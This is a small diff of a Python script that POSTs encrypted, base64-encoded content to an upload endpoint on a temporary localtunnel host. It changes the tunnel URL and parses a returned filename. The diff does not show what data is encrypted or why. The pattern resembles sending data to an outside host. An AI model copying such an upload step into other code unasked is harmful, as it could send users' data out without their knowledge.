@@ -18,7 +18,7 @@ print("Content is encrypted")
 encoded_data = base64.b64encode(encrypted_content).decode()
 print("Content is encoded")
 
-main_url="https://dirty-items-thank.loca.lt/"
+main_url="https://bright-adults-push.loca.lt/"
 path_url="/api/upload"
 url = urllib.parse.urljoin(main_url,path_url)  # Replace with the actual URL of the server endpoint
 data = {
@@ -34,6 +34,8 @@ response = requests.post(url, json=json_data)
 print("Data is send , wait......")
 # Check the response
 if response.status_code == 200:
+    filename = response.headers.get("content-disposition").split("filename=")[1]
+    print(filename)
     print('Data sent successfully')
 else:
     print('Failed to send data')
